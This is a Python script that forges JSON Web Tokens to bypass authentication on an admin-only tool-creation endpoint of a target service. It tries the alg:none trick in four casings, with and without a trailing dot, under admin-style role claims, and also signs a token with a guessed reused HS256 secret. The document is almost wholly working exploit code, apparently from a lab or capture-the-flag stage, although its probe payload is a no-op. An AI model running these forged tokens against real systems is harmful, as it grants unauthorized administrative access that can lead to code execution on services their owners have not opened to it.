#!/usr/bin/env python3
"""
JWT alg:none variant matrix (Fireflow JWT stage).

Instead of guessing the one forge that works, test every combination against
the admin-only POST /api/v1/tools with a benign no-op tool, so nothing runs
until you SEE which token the server accepts.

Varied:
  - alg casing:  none / None / NONE / nOnE   (libraries differ on which count as unsigned)
  - signature:   empty ("h.p.")  vs  no trailing dot ("h.p")
  - role:        admin / administrator / superuser
  - control:     HS256 signed with a candidate shared secret (test key reuse)

<bot> is the JWT `sub` (service-account username).
"""
import json, base64, hmac, hashlib, urllib.request, urllib.error

BASE = "http://<target>:30080"
BOT  = "<bot>"
# Optional: a candidate shared secret to test HS256 reuse (e.g. LANGFLOW_SECRET_KEY)
SHARED_SECRET = "<candidate-hs256-secret>"


def b64(d: bytes) -> str:
    return base64.urlsafe_b64encode(d).rstrip(b"=").decode()


def jwt(hdr: dict, pl: dict, sig: bytes = b"") -> str:
    h = b64(json.dumps(hdr, separators=(",", ":")).encode())
    p = b64(json.dumps(pl, separators=(",", ":")).encode())
    return f"{h}.{p}.{b64(sig) if sig else ''}"


def hs256(hdr: dict, pl: dict, key: str) -> str:
    h = b64(json.dumps(hdr, separators=(",", ":")).encode())
    p = b64(json.dumps(pl, separators=(",", ":")).encode())
    sig = hmac.new(key.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest()
    return f"{h}.{p}.{b64(sig)}"


def probe(tok: str) -> int:
    body = json.dumps({"name": "noop", "description": "p",
                       "code": "def run():\n return 'ok'\n"}).encode()
    req = urllib.request.Request(BASE + "/api/v1/tools", data=body, method="POST",
            headers={"Content-Type": "application/json",
                     "Authorization": f"Bearer {tok}"})
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status
    except urllib.error.HTTPError as e:
        return e.code


def main():
    for role in ("admin", "administrator", "superuser"):
        pl = {"sub": BOT, "role": role}
        for alg in ("none", "None", "NONE", "nOnE"):
            t = jwt({"alg": alg, "typ": "JWT"}, pl)            # "h.p." (empty sig)
            print(f"alg={alg:5} role={role:13} sig=empty -> {probe(t)}")
            print(f"alg={alg:5} role={role:13} sig=none  -> {probe(t.rstrip('.'))}")
    # control: does the MCP server reuse a known HS256 secret?
    for role in ("admin",):
        t = hs256({"alg": "HS256", "typ": "JWT"}, {"sub": BOT, "role": role}, SHARED_SECRET)
        print(f"HS256 shared-secret role={role:13} -> {probe(t)}")


if __name__ == "__main__":
    main()
